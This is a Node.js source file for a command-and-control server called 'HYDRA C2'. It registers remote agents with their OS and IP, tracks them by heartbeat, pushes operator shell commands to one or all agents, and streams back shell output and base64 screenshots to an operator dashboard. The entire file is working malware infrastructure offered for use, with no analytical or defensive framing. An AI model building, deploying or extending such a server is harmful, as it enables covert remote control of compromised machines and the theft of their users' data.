/**
 * NK HYDRA C2 v8.1 - STABLE HEARTBEAT EDITION
 * -------------------------------------------
 * FIX: "Ghost Agent" (1 Online) bug fixed via strict heartbeat.
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => {
    res.send('HYDRA C2 v8.1 [ACTIVE] - HEARTBEAT MONITORING ON');
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 5000,   // Fast timeout
    pingInterval: 5000   // Frequent ping
});

// MEMORY STORE
let agents = []; 

// HEARTBEAT CHECKER LOOP
// Removes agents that haven't updated 'lastSeen' in 15 seconds
setInterval(() => {
    const now = Date.now();
    const initialCount = agents.length;
    
    // Filter out stale agents
    agents = agents.filter(a => (now - a.lastSeen) < 15000);
    
    if (agents.length !== initialCount) {
        console.log(`[PRUNE] Removed ${initialCount - agents.length} stale agents.`);
        io.to('ui_room').emit('agents_list', agents);
    }
}, 5000);

io.on('connection', (socket) => {
    
    // --- IDENTIFICATION HANDLER ---
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            socket.emit('server_status', { status: 'HEALTHY' });
            return;
        }

        if (data.type === 'agent') {
            const existing = agents.find(a => a.id === data.id);
            if (existing) {
                existing.socketId = socket.id;
                existing.lastSeen = Date.now();
                existing.status = 'Online';
            } else {
                const newAgent = {
                    socketId: socket.id,
                    id: data.id,
                    os: data.os || 'Unknown',
                    ip: data.ip || socket.handshake.address,
                    status: 'Online',
                    lastSeen: Date.now()
                };
                agents.push(newAgent);
                io.to('ui_room').emit('agent_event', { 
                    type: 'SYSTEM', agentId: newAgent.id, payload: 'Node Joined 1533 Swarm' 
                });
            }
            io.to('ui_room').emit('agents_list', agents);
        }
    });

    // --- HEARTBEAT PING FROM AGENT ---
    socket.on('heartbeat', (data) => {
        const agent = agents.find(a => a.id === data.id);
        if (agent) {
            agent.lastSeen = Date.now();
            agent.status = 'Online';
        }
    });
    
    // --- TOOL TELEMETRY (NEW V53) ---
    socket.on('tool_log', (data) => {
        // Broadcast tool usage to UI
        io.to('ui_room').emit('agent_event', { 
            type: 'TOOL_LOG', 
            agentId: data.id, 
            payload: data.msg 
        });
    });

    // --- AGENT POLLING ---
    socket.on('get_agents', () => {
        socket.emit('agents_list', agents);
    });

    // --- COMMAND EXECUTION ---
    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        io.to('ui_room').emit('agent_event', { type: 'SYSTEM', agentId: 'SERVER', payload: `Exec: ${cmd}` });

        if (targetId === 'all') {
            const active = agents.filter(a => a.status === 'Online');
            active.forEach(a => io.to(a.socketId).emit('exec', { cmd }));
        } else {
            const agent = agents.find(a => a.id === targetId);
            if (agent && agent.status === 'Online') {
                io.to(agent.socketId).emit('exec', { cmd });
            }
        }
    });

    // --- DATA STREAMING ---
    socket.on('stream_log', (data) => {
        io.to('ui_room').emit('agent_event', { 
            type: 'SHELL_OUTPUT', 
            agentId: data.from, 
            payload: data.output 
        });
    });

    socket.on('upload_file', (data) => {
        io.to('ui_room').emit('agent_event', { 
            type: 'SCREENSHOT', 
            agentId: data.target || 'Unknown', 
            payload: data.b64content 
        });
    });

    // --- DISCONNECT ---
    socket.on('disconnect', () => {
        // Immediate cleanup attempt
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) {
            agent.status = 'Offline'; 
            // We rely on the interval pruner to remove it fully, 
            // but update status immediately for UI
            io.to('ui_room').emit('agents_list', agents);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`HYDRA V8.1 LISTENING ON PORT ${PORT}`);
});
